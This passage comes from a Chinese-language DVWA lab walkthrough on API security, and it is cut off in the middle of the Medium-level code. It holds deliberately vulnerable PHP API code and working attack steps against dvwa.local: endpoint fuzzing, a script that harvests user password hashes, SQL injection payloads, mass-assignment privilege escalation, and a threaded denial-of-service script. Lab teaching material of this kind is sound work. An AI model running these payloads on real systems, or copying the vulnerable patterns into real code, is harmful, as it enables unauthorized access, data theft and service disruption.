class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;User deleted&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Failed to delete user&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 404</span></span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">404</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">        <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Endpoint not found&#x27;</span></span><br><span class="line">    ]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><strong>核心问题：</strong></p>
+<ol>
+<li><strong>无认证</strong> - 任何人都可以访问</li>
+<li><strong>无授权</strong> - 不检查权限</li>
+<li><strong>SQL注入</strong> - 直接拼接SQL</li>
+<li><strong>批量赋值</strong> - 可修改任意字段</li>
+<li><strong>敏感信息泄露</strong> - 返回密码哈希</li>
+<li><strong>无限流</strong> - 可以DoS攻击</li>
+<li><strong>详细错误信息</strong> - 泄露系统信息</li>
+</ol>
+<h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><h4 id="步骤1：API枚举"><a href="#步骤1：API枚举" class="headerlink" title="步骤1：API枚举"></a>步骤1：API枚举</h4><p><strong>发现API端点：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用curl测试</span></span><br><span class="line">curl -X GET http://dvwa.local/api/users</span><br><span class="line">curl -X GET http://dvwa.local/api/users/1</span><br><span class="line">curl -X POST http://dvwa.local/api/users</span><br><span class="line">curl -X PUT http://dvwa.local/api/users/1</span><br><span class="line">curl -X DELETE http://dvwa.local/api/users/1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用Postman或Insomnia测试</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>使用工具发现API：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用gobuster</span></span><br><span class="line">gobuster <span class="built_in">dir</span> -u http://dvwa.local/api/ \</span><br><span class="line">             -w /usr/share/wordlists/api-endpoints.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用ffuf</span></span><br><span class="line">ffuf -u http://dvwa.local/api/FUZZ \</span><br><span class="line">     -w /usr/share/wordlists/api-endpoints.txt</span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤2：数据枚举"><a href="#步骤2：数据枚举" class="headerlink" title="步骤2：数据枚举"></a>步骤2：数据枚举</h4><p><strong>获取所有用户：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET http://dvwa.local/api/users</span><br></pre></td></tr></table></figure>
+
+<p><strong>响应：</strong></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;success&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;user_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;user&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5f4dcc3b5aa765d61d8327deb882cf99&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;first_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;last_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin@example.com&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;user_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;user&quot;</span><span class="punctuation">:</span> <span class="string">&quot;user1&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;098f6bcd4621d373cade4e832627b4f6&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;user1@example.com&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>枚举用户ID：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">base_url = <span class="string">&quot;http://dvwa.local/api/users&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Enumerating users...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> user_id <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    response = requests.get(<span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>/<span class="subst">&#123;user_id&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        data = response.json()</span><br><span class="line">        <span class="keyword">if</span> data.get(<span class="string">&#x27;success&#x27;</span>):</span><br><span class="line">            user = data.get(<span class="string">&#x27;data&#x27;</span>, &#123;&#125;)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] Found user <span class="subst">&#123;user_id&#125;</span>: <span class="subst">&#123;user.get(<span class="string">&#x27;user&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;    Email: <span class="subst">&#123;user.get(<span class="string">&#x27;email&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;    Password hash: <span class="subst">&#123;user.get(<span class="string">&#x27;password&#x27;</span>)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤3：未授权访问"><a href="#步骤3：未授权访问" class="headerlink" title="步骤3：未授权访问"></a>步骤3：未授权访问</h4><p><strong>查看其他用户数据：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看admin用户</span></span><br><span class="line">curl -X GET http://dvwa.local/api/users/1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果：可以看到admin的所有信息，包括密码哈希</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤4：SQL注入"><a href="#步骤4：SQL注入" class="headerlink" title="步骤4：SQL注入"></a>步骤4：SQL注入</h4><p><strong>在用户名中注入：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># SQL注入payload</span></span><br><span class="line">curl -X POST http://dvwa.local/api/users \</span><br><span class="line">     -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">     -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">       &quot;username&quot;: &quot;admin&#x27;</span>\<span class="string">&#x27;&#x27;</span> OR <span class="string">&#x27;\&#x27;</span><span class="string">&#x27;1&#x27;</span>\<span class="string">&#x27;&#x27;</span>=<span class="string">&#x27;\&#x27;</span><span class="string">&#x27;1&quot;,</span></span><br><span class="line"><span class="string">       &quot;password&quot;: &quot;password&quot;,</span></span><br><span class="line"><span class="string">       &quot;email&quot;: &quot;test@example.com&quot;</span></span><br><span class="line"><span class="string">     &#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 或使用UNION注入</span></span><br><span class="line">curl -X POST http://dvwa.local/api/users \</span><br><span class="line">     -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">     -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">       &quot;username&quot;: &quot;test&#x27;</span>\<span class="string">&#x27;&#x27;</span> UNION SELECT * FROM admin_table --<span class="string">&quot;,</span></span><br><span class="line"><span class="string">       &quot;</span>password<span class="string">&quot;: &quot;</span>password<span class="string">&quot;,</span></span><br><span class="line"><span class="string">       &quot;</span>email<span class="string">&quot;: &quot;</span><span class="built_in">test</span>@example.com<span class="string">&quot;</span></span><br><span class="line"><span class="string">     &#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤5：批量赋值攻击"><a href="#步骤5：批量赋值攻击" class="headerlink" title="步骤5：批量赋值攻击"></a>步骤5：批量赋值攻击</h4><p><strong>修改用户角色：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 提升普通用户为管理员</span></span><br><span class="line">curl -X PUT http://dvwa.local/api/users/5 \</span><br><span class="line">     -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">     -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">       &quot;user&quot;: &quot;hacker&quot;,</span></span><br><span class="line"><span class="string">       &quot;role&quot;: &quot;admin&quot;,</span></span><br><span class="line"><span class="string">       &quot;is_admin&quot;: 1,</span></span><br><span class="line"><span class="string">       &quot;privileges&quot;: &quot;all&quot;</span></span><br><span class="line"><span class="string">     &#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果：成功修改role和is_admin字段</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤6：删除用户"><a href="#步骤6：删除用户" class="headerlink" title="步骤6：删除用户"></a>步骤6：删除用户</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 删除管理员账户</span></span><br><span class="line">curl -X DELETE http://dvwa.local/api/users/1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果：管理员账户被删除</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤7：DoS攻击"><a href="#步骤7：DoS攻击" class="headerlink" title="步骤7：DoS攻击"></a>步骤7：DoS攻击</h4><p><strong>创建大量用户：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> concurrent.futures</span><br><span class="line"></span><br><span class="line">base_url = <span class="string">&quot;http://dvwa.local/api/users&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_fake_user</span>(<span class="params">i</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: <span class="string">f&#x27;fake_user_<span class="subst">&#123;i&#125;</span>&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;password&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span>: <span class="string">f&#x27;fake_<span class="subst">&#123;i&#125;</span>@example.com&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(base_url, json=data)</span><br><span class="line">    <span class="keyword">return</span> response.status_code</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用多线程创建1000个用户</span></span><br><span class="line"><span class="keyword">with</span> concurrent.futures.ThreadPoolExecutor(max_workers=<span class="number">50</span>) <span class="keyword">as</span> executor:</span><br><span class="line">    futures = [executor.submit(create_fake_user, i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> future <span class="keyword">in</span> concurrent.futures.as_completed(futures):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Created user: <span class="subst">&#123;future.result()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Medium-难度"><a href="#Medium-难度" class="headerlink" title="Medium 难度"></a>Medium 难度</h2><h3 id="攻击目标-1"><a href="#攻击目标-1" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>添加了简单的API密钥认证，但仍有漏洞。</p>
+<h3 id="后端代码分析-1"><a href="#后端代码分析-1" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application/json&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 新增：API密钥认证 ★★★</span></span><br><span class="line"><span class="comment">// 从请求头获取API密钥</span></span><br><span class="line"><span class="comment">// X-API-Key - 自定义请求头</span></span><br><span class="line"><span class="variable">$apiKey</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_API_KEY&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 问题：硬编码的API密钥 ★★★</span></span><br><span class="line"><span class="comment">// 密钥写死在代码中</span></span><br><span class="line"><span class="comment">// 而且只有一个密钥，所有用户共享</span></span><br><span class="line"><span class="variable">$validApiKey</span> = <span class="string">&#x27;dvwa_api_key_12345&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 验证API密钥 ★★★</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$apiKey</span> !== <span class="variable">$validApiKey</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">401</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">        <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Invalid API key&#x27;</span></span><br><span class="line">    ]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 新增：简单的限流 ★★★</span></span><br><span class="line"><span class="comment">// 但实现有问题</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_rate_limit</span>(<span class="params"><span class="variable">$api_key</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 使用文件存储请求计数</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="string">&quot;/tmp/api_rate_limit_<span class="subst">$api_key</span>.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 问题：文件锁不安全 ★★★</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查过去60秒的请求数</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">time</span>() - <span class="variable">$data</span>[<span class="string">&#x27;timestamp&#x27;</span>] &lt; <span class="number">60</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$data</span>[<span class="string">&#x27;count&#x27;</span>] &gt;= <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 超过限制</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;count&#x27;</span>]++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 重置计数</span></span><br><span class="line">            <span class="variable">$data</span> = [<span class="string">&#x27;timestamp&#x27;</span> =&gt; <span class="title function_ invoke__">time</span>(), <span class="string">&#x27;count&#x27;</span> =&gt; <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$data</span> = [<span class="string">&#x27;timestamp&#x27;</span> =&gt; <span class="title function_ invoke__">time</span>(), <span class="string">&#x27;count&#x27;</span> =&gt; <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$data</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">check_rate_limit</span>(<span class="variable">$apiKey</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">429</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">        <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Rate limit exceeded&#x27;</span></span><br><span class="line">    ]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$method</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>];</span><br><span class="line"><span class="variable">$path</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 新增：使用PDO预编译 ★★★</span></span><br><span class="line"><span class="comment">// 防止SQL注入</span></span><br><span class="line"><span class="keyword">global</span> <span class="variable">$db</span>; <span class="comment">// PDO连接</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// GET /api/users/&#123;id&#125;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$method</span> == <span class="string">&#x27;GET&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/users\/(\d+)$/&#x27;</span>, <span class="variable">$path</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$userId</span> = <span class="variable">$matches</span>[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进：使用PDO预编译 ★★★</span></span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT user_id, user, first_name, last_name, email FROM users WHERE user_id = :id&#x27;</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&#x27;:id&#x27;</span>, <span class="variable">$userId</span>, PDO::<span class="variable constant_">PARAM_INT</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$user</span>) &#123;</span><br><span class="line">        <span class="comment">// ★★★ 改进：不返回密码哈希 ★★★</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span> =&gt; <span class="variable">$user</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;User not found&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// PUT /api/users/&#123;id&#125;</span></span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="variable">$method</span> == <span class="string">&#x27;PUT&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/users\/(\d+)$/&#x27;</span>, <span class="variable">$path</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$userId</span> = <span class="variable">$matches</span>[<span class="number">1</span>];</span><br><span class="line">    <span class="variable">$input</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 问题：仍然没有授权检查 ★★★</span></span><br><span class="line">    <span class="comment">// 任何有API密钥的人都可以修改任何用户</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进：字段白名单 ★★★</span></span><br><span class="line">    <span class="comment">// 只允许修改特定字段</span></span><br><span class="line">    <span class="variable">$allowedFields</span> = [<span class="string">&#x27;first_name&#x27;</span>, <span class="string">&#x27;last_name&#x27;</span>, <span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$updates</span> = [];</span><br><span class="line">    <span class="variable">$params</span> = [<span class="string">&#x27;:id&#x27;</span> =&gt; <span class="variable">$userId</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$key</span>, <span class="variable">$allowedFields</span>)) &#123;</span><br><span class="line">            <span class="variable">$updates</span>[] = <span class="string">&quot;<span class="subst">$key</span> = :<span class="subst">$key</span>&quot;</span>;</span><br><span class="line">            <span class="variable">$params</span>[<span class="string">&quot;:<span class="subst">$key</span>&quot;</span>] = <span class="variable">$value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$updates</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span 